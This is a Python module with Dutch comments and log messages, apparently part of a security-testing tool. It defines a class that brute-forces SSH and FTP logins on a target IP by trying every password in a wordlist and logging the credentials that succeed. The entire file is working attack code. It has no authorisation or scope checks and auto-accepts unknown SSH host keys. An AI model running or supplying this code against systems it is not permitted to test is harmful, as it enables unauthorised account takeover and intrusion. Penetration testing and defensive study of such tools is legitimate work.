from ftplib import FTP
import logging

# Haal de logger op die geconfigureerd is in het hoofdscript
logger = logging.getLogger(__name__)

import paramiko

class BruteForceTester:
    def __init__(self, target_ip):
        self.target_ip = target_ip

    @staticmethod
    def load_wordlist(filename='./modules/wordlists/wordlist.txt'):
        #logger.info(os.getcwd())
        with open(filename, 'r') as file:
            return [line.strip() for line in file]

    def ssh_brute_force(self, username, password_list):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in password_list:
            try:
                ssh.connect(self.target_ip, username=username, password=password)
                logger.info(f"SSH Brute Force Succes! Gebruikersnaam: {username}, Wachtwoord: {password}")
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                logger.info(f"Mislukte poging - Gebruikersnaam: {username}, Wachtwoord: {password}")
            except Exception as e:
                logger.info(f"Fout: {str(e)}")

        logger.info("SSH Brute Force Mislukt. Wachtwoord niet gevonden in de opgegeven lijst.")
        return False

    def ftp_brute_force(self, username, password_list):
        for password in password_list:
            try:
                ftp = FTP(self.target_ip)
                ftp.login(username, password)
                ftp.quit()
                return f"FTP Brute Force Succes! Gebruikersnaam: {username}, Wachtwoord: {password}"
            except Exception as e:
                # Behandel FTP-loginfout (ongeldige referenties)
                logger.info(f"Mislukte poging - Gebruikersnaam: {username}, Wachtwoord: {password}")

        return "FTP Brute Force Mislukt. Wachtwoord niet gevonden in de opgegeven lijst."
